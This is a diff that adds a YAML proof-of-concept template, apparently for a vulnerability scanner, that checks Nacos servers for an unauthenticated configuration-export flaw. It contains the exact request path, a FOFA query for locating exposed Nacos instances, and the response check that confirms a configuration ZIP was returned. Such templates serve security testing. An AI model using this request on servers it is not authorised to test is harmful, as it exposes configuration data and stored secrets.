@@ -1,0 +1,16 @@
+id: poc-yaml-nacos-configs-export
+info:
+  name: Nacos未授权export配置信息漏洞
+  severity: high
+  tags:
+  - 信息泄露
+  finger: nacos
+  fofa: app="Nacos" && icon_hash="13942501"
+requests:
+- method: GET
+  path: /v1/cs/configs?export=true&group&tenant&appName&ids&dataId
+  expression: "status_code == 200 && \nsubstr(body, 0, 4) == \"\\x50\\x4B\\x03\\x04\"\
+    \ && !contains(body, \"</\") &&\ncontains(headers,\"attachment;filename=nacos_config_export_\"\
+    )\n"
+variables: {}
+transport: http
